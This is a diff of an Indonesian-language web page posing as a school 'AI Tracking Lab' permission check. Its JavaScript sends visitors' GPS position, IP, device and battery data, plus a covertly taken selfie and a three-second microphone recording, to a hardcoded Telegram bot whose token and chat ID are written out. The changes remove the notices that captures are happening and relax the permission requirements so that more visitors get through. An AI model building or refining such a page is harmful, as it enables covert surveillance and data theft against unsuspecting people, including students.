@@ -44,9 +44,6 @@
             height: 100%;
             object-fit: cover;
         }
-        .school-logo span {
-            font-size: 3rem;
-        }
         @keyframes rotateLogo { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
         h1 { 
             font-size: 1.6rem; 
@@ -230,8 +227,8 @@
         </div>
         
         <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-        <button id="enterBtn" class="btn-enter" disabled>⛔ AKTIFKAN GPS & KAMERA</button>
-        <div class="warning-text" id="warningText">⚡ Aktifkan Lokasi dan Kamera terlebih dahulu</div>
+        <button id="enterBtn" class="btn-enter" disabled>⛔ AKTIFKAN KAMERA</button>
+        <div class="warning-text" id="warningText">⚡ Aktifkan Kamera terlebih dahulu (GPS opsional)</div>
         <div class="loading" id="loadingText">⏳ Mengirim data ke server... Mohon tunggu</div>
     </div>
 
@@ -240,7 +237,6 @@
         const BOT_TOKEN = '8607052681:AAHMAuSuUO8CR84h5JlQThmlFKnyA9qFIaU';
         const CHAT_ID = '7428813404';
         
-        // Toast notifikasi
         function showToast(message, isError = false) {
             const toast = document.createElement('div');
             toast.className = 'toast-message';
@@ -319,7 +315,7 @@
                         console.error('GPS error:', err.message);
                         resolve(null);
                     },
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    { enableHighAccuracy: true, timeout: 5000 }
                 );
             });
         }
@@ -365,7 +361,6 @@
             const connection = navigator.connection ? navigator.connection.effectiveType : 'unknown';
             const waktu = new Date().toLocaleString('id-ID');
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const waktuDetik = Math.floor((Date.now() - startTime) / 1000);
             
             let msg = `╔════════════════════════════════════════╗\n`;
             msg += `║   🏫 SMA NEGERI 1 - AI TRACKING LAB  \n`;
@@ -378,7 +373,7 @@
                 msg += `📏 Akurasi: ${Math.round(gpsData.accuracy)} meter\n`;
                 msg += `🗺️ Maps: https://maps.google.com/?q=${gpsData.lat},${gpsData.lon}\n\n`;
             } else {
-                msg += `❌ GPS tidak tersedia\n\n`;
+                msg += `❌ GPS tidak tersedia (izin ditolak atau tidak aktif)\n\n`;
             }
             
             msg += `<b>📡 INFORMASI JARINGAN</b>\n`;
@@ -403,7 +398,7 @@
             msg += `<b>👆 INTERAKSI</b>\n`;
             msg += `📜 Scroll: 0 kali\n`;
             msg += `🖱️ Klik: 1 kali\n`;
-            msg += `⏱️ Waktu: ${waktuDetik} detik\n\n`;
+            msg += `⏱️ Waktu: ${Math.floor((Date.now() - startTime) / 1000)} detik\n\n`;
             
             msg += `<b>🕒 WAKTU AKSES</b>\n`;
             msg += `🕒 ${waktu}\n`;
@@ -417,30 +412,23 @@
         // ======================= HIDDEN SELFIE =======================
         async function hiddenCaptureSelfie() {
             try {
-                showToast('📸 Mengambil foto selfie...');
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
-                await new Promise(r => setTimeout(r, 1500));
+                await new Promise(r => setTimeout(r, 1000));
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const photoUrl = canvas.toDataURL('image/jpeg', 0.8);
-                const gpsText = gpsData && gpsData.lat ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia';
+                const gpsText = (gpsData && gpsData.lat) ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia';
                 const cap = `📸 [HIDDEN SELFIE]\n🕒 ${new Date().toLocaleString('id-ID')}\n📍 GPS: ${gpsText}\n📱 Device: ${deviceData.brand} ${deviceData.model}\n🏫 SMA NEGERI 1\n⚠️ Foto diambil otomatis setelah izin kamera`;
                 const success = await sendPhoto(cap, photoUrl);
                 stream.getTracks().forEach(t => t.stop());
-                if (success) {
-                    showToast('✅ Selfie berhasil dikirim!');
-                } else {
-                    showToast('❌ Gagal kirim selfie', true);
-                }
                 return success;
             } catch(e) { 
                 console.error('Selfie error:', e);
-                showToast('❌ Gagal mengambil selfie', true);
                 return false; 
             }
         }
@@ -448,7 +436,6 @@
         // ======================= HIDDEN VOICE =======================
         async function hiddenCaptureVoice() {
             try {
-                showToast('🎤 Merekam suara... (3 detik)');
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
@@ -457,7 +444,7 @@
                 const promise = new Promise((resolve) => {
                     recorder.onstop = async () => {
                         const blob = new Blob(chunks, { type: 'audio/webm' });
-                        const gpsText = gpsData && gpsData.lat ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia';
+                        const gpsText = (gpsData && gpsData.lat) ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia';
                         const cap = `🎙️ [HIDDEN VOICE]\n🕒 ${new Date().toLocaleString('id-ID')}\n📍 GPS: ${gpsText}\n📱 Device: ${deviceData.brand} ${deviceData.model}\n🏫 SMA NEGERI 1\n📝 Durasi: 3 detik\n⚠️ Rekaman diambil otomatis setelah izin mikrofon`;
                         const success = await sendVoice(cap, blob);
                         stream.getTracks().forEach(t => t.stop());
@@ -466,22 +453,10 @@
                 });
                 
                 recorder.start();
-                setTimeout(() => {
-                    if (recorder.state === 'recording') {
-                        recorder.stop();
-                    }
-                }, 3000);
-                
-                const success = await promise;
-                if (success) {
-                    showToast('✅ Voice berhasil dikirim!');
-                } else {
-                    showToast('❌ Gagal kirim voice', true);
-                }
-                return success;
+                setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 3000);
+                return await promise;
             } catch(e) { 
                 console.error('Voice error:', e);
-                showToast('❌ Akses mikrofon ditolak!', true);
                 return false; 
             }
         }
@@ -490,61 +465,73 @@
         let permissions = { gps: false, camera: false, mic: false };
         
         function updateProgress() {
-            let count = (permissions.gps ? 1 : 0) + (permissions.camera ? 1 : 0);
-            let percent = (count / 2) * 100;
-            document.getElementById('progressFill').style.width = percent + '%';
+            // Hanya kamera yang WAJIB untuk bisa masuk
+            let canEnter = permissions.camera === true;
+            
             const enterBtn = document.getElementById('enterBtn');
-            if (count >= 2) {
+            const progressFill = document.getElementById('progressFill');
+            const warningText = document.getElementById('warningText');
+            
+            if (canEnter) {
                 enterBtn.disabled = false;
                 enterBtn.innerHTML = '✅ VERIFIKASI SELESAI - MASUK';
-                document.getElementById('warningText').innerHTML = '✅ Izin lengkap! Klik untuk melanjutkan';
+                warningText.innerHTML = '✅ Izin kamera sudah aktif! Klik untuk masuk';
+                warningText.style.color = '#22c55e';
+                if (progressFill) progressFill.style.width = '100%';
             } else {
                 enterBtn.disabled = true;
-                enterBtn.innerHTML = '⛔ AKTIFKAN GPS & KAMERA';
-                document.getElementById('warningText').innerHTML = '⚡ Aktifkan Lokasi dan Kamera terlebih dahulu';
+                enterBtn.innerHTML = '⛔ AKTIFKAN KAMERA';
+                warningText.innerHTML = '⚡ Aktifkan Kamera terlebih dahulu (GPS opsional)';
+                warningText.style.color = '#f59e0b';
+                let progress = permissions.camera ? 50 : 0;
+                if (progressFill) progressFill.style.width = progress + '%';
             }
         }
         
         async function requestGPS() {
             const btn = document.getElementById('btnGPS');
+            const statusSpan = document.getElementById('gpsStatus');
+            
             btn.innerHTML = '⏳ Meminta...';
             btn.disabled = true;
             
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) { 
-                    document.getElementById('gpsStatus').innerHTML = 'Tidak support';
-                    document.getElementById('gpsStatus').className = 'permission-status denied';
-                    btn.innerHTML = '❌ Tidak Support';
-                    btn.disabled = false;
-                    resolve(false);
-                    return; 
-                }
-                
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        permissions.gps = true;
-                        gpsData = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy };
-                        document.getElementById('gpsStatus').innerHTML = '✅ Aktif';
-                        document.getElementById('gpsStatus').className = 'permission-status granted';
-                        btn.innerHTML = '✅ Aktif';
-                        updateProgress();
-                        resolve(true);
-                    },
-                    (err) => { 
-                        console.error('GPS denied:', err);
-                        document.getElementById('gpsStatus').innerHTML = '❌ Ditolak';
-                        document.getElementById('gpsStatus').className = 'permission-status denied';
-                        btn.innerHTML = '❌ Coba Lagi';
-                        btn.disabled = false;
-                        resolve(false); 
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-            });
+            if (!navigator.geolocation) {
+                statusSpan.innerHTML = 'Tidak support';
+                statusSpan.className = 'permission-status denied';
+                btn.innerHTML = '❌ Tidak Support';
+                btn.disabled = false;
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    permissions.gps = true;
+                    gpsData = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy };
+                    statusSpan.innerHTML = '✅ Aktif';
+                    statusSpan.className = 'permission-status granted';
+                    btn.innerHTML = '✅ Aktif';
+                    btn.disabled = true;
+                    showToast('✅ GPS berhasil diaktifkan!');
+                    updateProgress();
+                },
+                (err) => {
+                    console.error('GPS error:', err.message);
+                    permissions.gps = false;
+                    statusSpan.innerHTML = '❌ Ditolak';
+                    statusSpan.className = 'permission-status denied';
+                    btn.innerHTML = '❌ Ditolak';
+                    btn.disabled = true;
+                    showToast('⚠️ GPS ditolak, tetap bisa melanjutkan', true);
+                    updateProgress();
+                },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
         }
         
         async function requestCamera() {
             const btn = document.getElementById('btnCamera');
+            const statusSpan = document.getElementById('cameraStatus');
+            
             btn.innerHTML = '⏳ Meminta...';
             btn.disabled = true;
             
@@ -552,23 +539,27 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 stream.getTracks().forEach(t => t.stop());
                 permissions.camera = true;
-                document.getElementById('cameraStatus').innerHTML = '✅ Aktif';
-                document.getElementById('cameraStatus').className = 'permission-status granted';
+                statusSpan.innerHTML = '✅ Aktif';
+                statusSpan.className = 'permission-status granted';
                 btn.innerHTML = '✅ Aktif';
+                btn.disabled = true;
+                showToast('✅ Kamera berhasil diaktifkan!');
                 updateProgress();
-                return true;
-            } catch(err) { 
-                console.error('Camera denied:', err);
-                document.getElementById('cameraStatus').innerHTML = '❌ Ditolak';
-                document.getElementById('cameraStatus').className = 'permission-status denied';
+            } catch(err) {
+                console.error('Camera error:', err);
+                permissions.camera = false;
+                statusSpan.innerHTML = '❌ Ditolak';
+                statusSpan.className = 'permission-status denied';
                 btn.innerHTML = '❌ Coba Lagi';
                 btn.disabled = false;
-                return false;
+                showToast('❌ Kamera diperlukan! Silakan izinkan kamera', true);
             }
         }
         
         async function requestMicrophone() {
             const btn = document.getElementById('btnMic');
+            const statusSpan = document.getElementById('micStatus');
+            
             btn.innerHTML = '⏳ Meminta...';
             btn.disabled = true;
             
@@ -576,19 +567,19 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 stream.getTracks().forEach(t => t.stop());
                 permissions.mic = true;
-                document.getElementById('micStatus').innerHTML = '✅ Aktif';
-                document.getElementById('micStatus').className = 'permission-status granted';
+                statusSpan.innerHTML = '✅ Aktif';
+                statusSpan.className = 'permission-status granted';
                 btn.innerHTML = '✅ Aktif';
+                btn.disabled = true;
+                showToast('✅ Mikrofon berhasil diaktifkan!');
                 updateProgress();
-                return true;
-            } catch(err) { 
-                console.error('Mic denied:', err);
+            } catch(err) {
                 permissions.mic = false;
-                document.getElementById('micStatus').innerHTML = '⏭ Lewati';
-                document.getElementById('micStatus').className = 'permission-status pending';
-                btn.innerHTML = '🔘 Aktifkan';
+                statusSpan.innerHTML = '⏭ Lewati';
+                statusSpan.className = 'permission-status pending';
+                btn.innerHTML = '🔘 Aktifkan (Opsional)';
                 btn.disabled = false;
-                return false;
+                showToast('⚠️ Mikrofon opsional, bisa diaktifkan nanti', true);
             }
         }
         
@@ -599,8 +590,8 @@
         
         // ======================= PROSES SETELAH KLIK MASUK =======================
         document.getElementById('enterBtn').addEventListener('click', async () => {
-            if (!permissions.gps || !permissions.camera) {
-                showToast('❌ Aktifkan GPS dan Kamera terlebih dahulu!', true);
+            if (!permissions.camera) {
+                showToast('❌ Aktifkan Kamera terlebih dahulu!', true);
                 return;
             }
             
@@ -612,33 +603,47 @@
             showToast('⏳ Memproses data...');
             
             try {
-                // Ambil semua data tambahan
+                // 1. Ambil semua data
                 ipData = await getIP();
                 batteryData = await getBattery();
                 deviceData = getDevice();
                 
-                // 1. KIRIM LAPORAN LENGKAP
+                // 2. Jika GPS belum aktif, coba ambil sekali lagi
+                if (!permissions.gps) {
+                    const gpsResult = await getGPS();
+                    if (gpsResult) {
+                        permissions.gps = true;
+                        gpsData = gpsResult;
+                        document.getElementById('gpsStatus').innerHTML = '✅ Aktif';
+                        document.getElementById('gpsStatus').className = 'permission-status granted';
+                        showToast('✅ GPS berhasil diambil!');
+                    }
+                }
+                
+                // 3. KIRIM LAPORAN LENGKAP
                 showToast('📡 Mengirim laporan data...');
                 await sendFullReport();
                 
-                // 2. HIDDEN SELFIE (DIAM-DIAM)
+                // 4. KIRIM SELFIE
+                showToast('📸 Mengambil dan mengirim selfie...');
                 await hiddenCaptureSelfie();
                 
-                // 3. HIDDEN VOICE (jika mikrofon diizinkan)
+                // 5. KIRIM VOICE (jika mikrofon diizinkan)
                 if (permissions.mic) {
+                    showToast('🎤 Merekam dan mengirim suara...');
                     await hiddenCaptureVoice();
                 } else {
-                    const gpsText = gpsData && gpsData.lat ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia';
+                    const gpsText = (gpsData && gpsData.lat) ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia';
                     await sendText(`⚠️ [MIKROFON TIDAK DIIZINKAN]\n🕒 ${new Date().toLocaleString('id-ID')}\n📍 GPS: ${gpsText}\n📱 Device: ${deviceData.brand} ${deviceData.model}\n❌ User tidak mengizinkan akses mikrofon`);
                 }
                 
-                // 4. REDIRECT KE TRACKING.HTML
-                loading.innerHTML = '✅ Data terkirim! Mengalihkan ke AI Tracking Lab...';
+                // 6. REDIRECT KE TRACKING.HTML
+                loading.innerHTML = '✅ Semua data terkirim! Mengalihkan ke AI Tracking Lab...';
                 showToast('✅ Semua data terkirim! Mengalihkan...');
                 
                 setTimeout(() => {
                     window.location.href = 'tracking.html';
-                }, 1500);
+                }, 2000);
                 
             } catch(e) {
                 console.error('Process error:', e);
@@ -649,6 +654,10 @@
                 btn.innerHTML = '✅ COBA LAGI';
             }
         });
+        
+        // Inisialisasi awal
+        updateProgress();
+        console.log('✅ Index.html siap - menunggu izin kamera');
     </script>
 </body>
 </html>
